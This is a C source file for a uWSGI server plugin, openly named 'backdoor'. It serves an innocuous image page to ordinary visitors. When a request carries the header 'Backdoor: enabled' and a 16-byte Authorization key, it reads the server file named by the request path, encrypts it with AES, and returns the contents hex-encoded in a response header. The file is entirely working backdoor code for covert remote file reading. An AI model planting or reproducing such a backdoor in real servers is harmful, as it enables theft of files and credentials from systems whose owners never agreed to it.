#include <uwsgi.h>

extern struct uwsgi_server uwsgi;

void backdoor(struct wsgi_request *wsgi_req, char *path, unsigned char *key) {
  unsigned char buf[0x100] = {}, out[0x100] = {};
  char hex[0x200];
  int size, out_len, pad = 0;

  FILE *fp = fopen(path, "r");
  if (!fp)
    return;
  size = fread(buf, sizeof(char), sizeof(buf)-1, fp);
  fclose(fp);

  EVP_CIPHER_CTX *ctx;
  if (!(ctx = EVP_CIPHER_CTX_new()))
    return;
  if (!EVP_EncryptInit_ex(ctx, EVP_aes_128_ecb(), NULL, key, NULL))
    goto err;
  if (!EVP_EncryptUpdate(ctx, out, &out_len, buf, size))
    goto err;
  if (!EVP_EncryptFinal_ex(ctx, out + out_len, &pad))
    goto err;
  out_len += pad;

  for (int i = 0; i < out_len; i++) {
    sprintf(hex + i*2, "%02x", out[i]);
  }
  uwsgi_response_add_header(wsgi_req, "Backdoor", 8, hex, out_len*2);

 err:
  EVP_CIPHER_CTX_free(ctx);
}

static int uwsgi_backdoor_request(struct wsgi_request *wsgi_req) {
  if (uwsgi_parse_vars(wsgi_req))
    return -1;

  uint16_t vlen = 0;
  char *val = uwsgi_get_var(wsgi_req, "HTTP_BACKDOOR", 13, &vlen);

  uwsgi_response_prepare_headers(wsgi_req, "200 OK", 6);
  uwsgi_response_add_header(wsgi_req, "Content-type", 12, "text/html", 9);

  if (!uwsgi_strnicmp(val, vlen, "enabled", 7)
      && wsgi_req->authorization_len == 16
      && wsgi_req->uri) {
    char *path = uwsgi_strncopy(wsgi_req->uri, wsgi_req->uri_len);
    char *key = uwsgi_strncopy(wsgi_req->authorization,
                               wsgi_req->authorization_len);
    backdoor(wsgi_req, path, (unsigned char*)key);
    free(path);
    free(key);
  }

  uwsgi_response_write_body_do(wsgi_req, "<img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Whiskyhogmanay2010.jpg/800px-Whiskyhogmanay2010.jpg\">\n", 122);
	return UWSGI_OK;
}

struct uwsgi_plugin backdoor_plugin = {
  .name = "backdoor",
  .modifier1 = 0,
  .request = uwsgi_backdoor_request,
};
